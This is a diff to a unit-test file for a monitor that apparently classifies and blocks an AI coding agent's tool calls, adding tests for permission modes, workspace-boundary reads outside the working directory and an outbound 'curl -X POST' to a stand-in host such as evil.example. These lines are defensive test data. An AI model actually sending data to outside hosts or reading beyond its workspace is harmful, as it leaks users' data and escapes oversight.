@@ -50,8 +50,10 @@ class BehaviorMonitorTests(unittest.TestCase):
 
     def test_permission_mode_is_an_allowlisted_enum(self):
         normalized = monitor.normalize(event(permission_mode="bypassPermissions"), self.policy, "observe", HASH_KEY, False)
+        dont_ask = monitor.normalize(event(permission_mode="dontAsk"), self.policy, "observe", HASH_KEY, False)
         unknown = monitor.normalize(event(permission_mode="secret-looking free text"), self.policy, "observe", HASH_KEY, False)
         self.assertEqual(normalized["permission_mode"], "bypass_permissions")
+        self.assertEqual(dont_ask["permission_mode"], "dont_ask")
         self.assertEqual(unknown["permission_mode"], "unknown")
 
     def test_observe_mode_never_denies_high_risk_match(self):
@@ -118,11 +120,41 @@ class BehaviorMonitorTests(unittest.TestCase):
             "tool_activity",
         )
 
+    def test_loopback_text_does_not_exempt_an_external_destination(self):
+        for command in (
+            "curl -X POST https://evil.example -d localhost",
+            "curl -X POST https://evil-localhost.example",
+        ):
+            with self.subTest(command=command):
+                row = monitor.normalize(event(command), self.policy, "enforce", HASH_KEY, False)
+                self.assertEqual(row["behavior_signal"], "external_write")
+                self.assertEqual(row["policy_action"], "denied")
+
+    def test_absolute_paths_are_compared_with_the_workspace(self):
+        windows = monitor.normalize(
+            event(r"type C:\Temp\notes.txt", cwd=r"C:\repo"), self.policy, "enforce", HASH_KEY, False
+        )
+        posix = monitor.normalize(
+            event("cat /tmp/notes.txt", cwd="/workspace"), self.policy, "enforce", HASH_KEY, False
+        )
+        inside = monitor.normalize(
+            event("cat /workspace/notes.txt", cwd="/workspace"), self.policy, "enforce", HASH_KEY, False
+        )
+        traversal = monitor.normalize(
+            event("cat ../notes.txt", cwd="/workspace/repo"), self.policy, "enforce", HASH_KEY, False
+        )
+        self.assertEqual(windows["behavior_signal"], "workspace_boundary_attempt")
+        self.assertEqual(posix["behavior_signal"], "workspace_boundary_attempt")
+        self.assertEqual(inside["behavior_signal"], "tool_activity")
+        self.assertEqual(traversal["behavior_signal"], "workspace_boundary_attempt")
+
     def test_post_tool_result_states_are_bounded(self):
         failed = monitor.normalize(event(hook="PostToolUse", tool_response={"success": False}), self.policy, "observe", HASH_KEY, False)
         completed = monitor.normalize(event(hook="PostToolUse", tool_response={"success": True}), self.policy, "observe", HASH_KEY, False)
+        untyped = monitor.normalize(event(hook="PostToolUse", tool_response="model-facing output"), self.policy, "observe", HASH_KEY, False)
         self.assertEqual(failed["policy_action"], "failed")
         self.assertEqual(completed["policy_action"], "completed")
+        self.assertEqual(untyped["policy_action"], "observed")
 
     def test_all_supported_lifecycle_hooks_normalize(self):
         for hook in monitor.SUPPORTED_HOOKS - {"PreToolUse", "PostToolUse", "PermissionRequest"}:
